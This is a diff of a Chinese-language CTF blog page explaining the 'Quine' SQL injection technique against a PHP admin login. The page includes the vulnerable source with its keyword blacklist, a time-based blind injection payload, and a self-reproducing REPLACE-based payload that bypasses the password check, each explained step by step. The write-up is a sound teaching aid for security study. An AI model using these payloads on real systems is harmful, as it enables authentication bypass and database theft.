@@ -176,87 +176,119 @@
             <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><code>Quine</code>又叫做自产生程序，在<code>sql</code>注入技术中，这是一种是的输入的<code>SQL</code></p>
 <p>语句与输出的<code>SQL</code>语句一致的技术，常用于一些特殊的登陆绕过<code>sql</code>注入中。</p>
 <p>实践</p>
-<p>&lt;!–code￼0–&gt;
+<pre class="line-numbers language-none"><code class="language-none">function checkSql($s) &#123;
+    if(preg_match(&quot;&#x2F;regexp|between|in|flag|&#x3D;|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ &#x2F;i&quot;,$s))&#123;
+        alertMes(&#39;hacker&#39;, &#39;index.php&#39;);
+    &#125;
+&#125;
 
-</p>
+if (isset($_POST[&#39;username&#39;]) &amp;&amp; $_POST[&#39;username&#39;] !&#x3D; &#39;&#39; &amp;&amp; isset($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;password&#39;] !&#x3D; &#39;&#39;) &#123;
+    $username&#x3D;$_POST[&#39;username&#39;];
+    $password&#x3D;$_POST[&#39;password&#39;];
+    if ($username !&#x3D;&#x3D; &#39;admin&#39;) &#123;
+        alertMes(&#39;only admin can login&#39;, &#39;index.php&#39;);
+    &#125;
+    checkSql($password);
+    $sql&#x3D;&quot;SELECT password FROM users WHERE username&#x3D;&#39;admin&#39; and password&#x3D;&#39;$password&#39;;&quot;;
+    $user_result&#x3D;mysqli_query($con,$sql);
+    $row &#x3D; mysqli_fetch_array($user_result);
+    if (!$row) &#123;
+        alertMes(&quot;something wrong&quot;,&#39;index.php&#39;);
+    &#125;
+    if ($row[&#39;password&#39;] &#x3D;&#x3D;&#x3D; $password) &#123;
+    die($FLAG);
+    &#125; else &#123;
+    alertMes(&quot;wrong password&quot;,&#39;index.php&#39;);
+  &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>观察这个源码，存在一个看似很明显的<code>SQL</code>注入，黑名单中还有许多的过滤。</p>
 <p>例如：</p>
 <p>like替换’&#x3D;’,benchmark()替换sleep函数，mid()函数替换<code>substr()</code>函数，&#x2F;**&#x2F;替换空格。</p>
 <p>下面是注入的payload</p>
-<p>&lt;!–code￼1–&gt;
+<pre class="line-numbers language-none"><code class="language-none">union select if((select ascii(mid((select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema like database()),&#123;&#125;,1)) like &#123;&#125;),(select benchmark(4999999,md5(&#39;test&#39;))),1)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>（<code>sys.schema_table_statistics_with_buffer</code>是<code>Mysql</code>数据库中的一个系统视图，提供了数据库中的表哦的统计信息和缓冲池的使用情况）</p>
 <p>这样注入得到的表中并没有密码。</p>
 <p>再观察源码</p>
-<p>&lt;!–code￼2–&gt;
+<pre class="line-numbers language-none"><code class="language-none">$sql&#x3D;&quot;SELECT password FROM users WHERE username&#x3D;&#39;admin&#39; and password&#x3D;&#39;$password&#39;;&quot;;
+$user_result&#x3D;mysqli_query($con,$sql);
+$row &#x3D; mysqli_fetch_array($user_result);
 
-</p>
+if ($row[&#39;password&#39;] &#x3D;&#x3D;&#x3D; $password) &#123;
+    die($FLAG);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>简单说说就是<code>sql</code>查询得到的结果与password相等，那么除了正常的逻辑的密码相同会产生相等，如果我们的输入与最后的结果，一样可以绕过验证，这就是<code>Quine</code>。</p>
-<p>&lt;!–code￼3–&gt;
+<pre class="line-numbers language-none"><code class="language-none">REPLACE ( string1 , string2 , string3 )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>首先要知道replace函数的三个参数，第一个参数是要替换的整个字符串，第二个参数被替换的字符(串) ，第三个是要替换成的字符(串)</p>
 <p>直接分析这个地方使用<code>Quine</code>技术的payload</p>
-<p>&lt;!–code￼4–&gt;
+<pre class="line-numbers language-none"><code class="language-none">union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&#39;&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;ch3ns1r#&#39;,CHAR(34),CHAR(39)),CHAR(46),&#39;&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;ch3ns1r#&#39;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;ch3ns1r#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>首先是一个大的REPLACE(),令他为A</p>
-<p>&lt;!–code￼5–&gt;
+<pre class="line-numbers language-none"><code class="language-none">REPLACE(&#39;&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;ch3ns1r#&#39;,CHAR(34),CHAR(39))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>其中有一个字符串，令他为B</p>
-<p>&lt;!–code￼6–&gt;
+<pre class="line-numbers language-none"><code class="language-none">&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;ch3ns1r#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>则最初的payload就为</p>
-<p>&lt;!–code￼7–&gt;
+<pre class="line-numbers language-none"><code class="language-none">union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(A,CHAR(46),B)&#x2F;**&#x2F;AS&#x2F;**&#x2F;ch3ns1r#
 
-</p>
+A：REPLACE(&#39;B&#39;,CHAR(34),CHAR(39))
+B：&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;ch3ns1r#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>下面这个就是<code>Quine</code>的基本形式了</p>
-<p>&lt;!–code￼8–&gt;
+<pre class="line-numbers language-none"><code class="language-none">REPLACE(A,CHAR(46),B)  ----char(46)&#x3D; .   char(34)&#x3D;&quot;   char(39)&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>外层replace()：将双引号char(34)双引号替换为char(39)单引号。</p>
 <p>内层replace():  将点号char(46)替换为整个payload字符串。</p>
 <p>举个例子：<br>假设一个<code>str</code>为（）</p>
-<p>&lt;!–code￼9–&gt;
+<pre class="line-numbers language-none"><code class="language-none">REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>最后的语句为：</p>
-<p>&lt;!–code￼10–&gt;
+<pre class="line-numbers language-none"><code class="language-none">REPLACE(&#39;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#39;,CHAR(46),&#39;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>首先执行char(46)得到的是点号，然后执行replace()</p>
 <p>最后得到的结果是：</p>
-<p>&lt;!–code￼11–&gt;
+<pre class="line-numbers language-none"><code class="language-none">REPLACE(&#39;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#39;,CHAR(46),&#39;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>将<code>str1</code>中的点号都替换为了<code>str</code></p>
 <p>最后再详细的解释一下最开始的payload</p>
-<p>&lt;!–code￼12–&gt;
+<pre class="line-numbers language-none"><code class="language-none">&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&#39;&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;ch3ns1r#&#39;,CHAR(34),CHAR(39)),CHAR(46),&#39;&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;ch3ns1r#&#39;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;ch3ns1r#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>完整的结构为：</p>
-<p>&lt;!–code￼13–&gt;
+<pre class="line-numbers language-none"><code class="language-none">REPLACE(
+  REPLACE(
+    &#39;原Payload字符串&#39;,
+    CHAR(34),  -- 替换双引号为单引号
+    CHAR(39)
+  ),
+  CHAR(46),    -- 替换点号(.)为新的Payload
+  &#39;新Payload字符串&#39;
+)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>首先执行内层的replace()</p>
-<p>&lt;!–code￼14–&gt;
+<pre class="line-numbers language-none"><code class="language-none">REPLACE(
+    &#39;原Payload字符串&#39;,
+    CHAR(34),  -- 替换双引号为单引号
+    CHAR(39)
+  )
 
-</p>
+原Payload字符串：&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;ch3ns1r#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>得到的结果为：</p>
-<p>&lt;!–code￼15–&gt;
+<pre class="line-numbers language-none"><code class="language-none">&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&#39;.&#39;,CHAR(34),CHAR(39)),CHAR(46),&#39;.&#39;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;ch3ns1r#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>再执行外部的replace</p>
-<p>&lt;!–code￼16–&gt;
+<pre class="line-numbers language-none"><code class="language-none">REPLACE(
+  第一次的结果,
+  CHAR(46),    -- 替换点号(.)为新的Payload
+  &#39;新Payload字符串&#39;
+)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>得到的结果为：</p>
-<p>&lt;!–code￼17–&gt;
+<pre class="line-numbers language-none"><code class="language-none">&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&#39;&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;ch3ns1r#&#39;,CHAR(34),CHAR(39)),CHAR(46),&#39;&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;ch3ns1r#&#39;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;ch3ns1r#&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p><strong>精妙的地方：</strong></p>
 <p>通过内层的replace()将单引号全部转化为了双引号从而解决了符号的问题。</p>
 
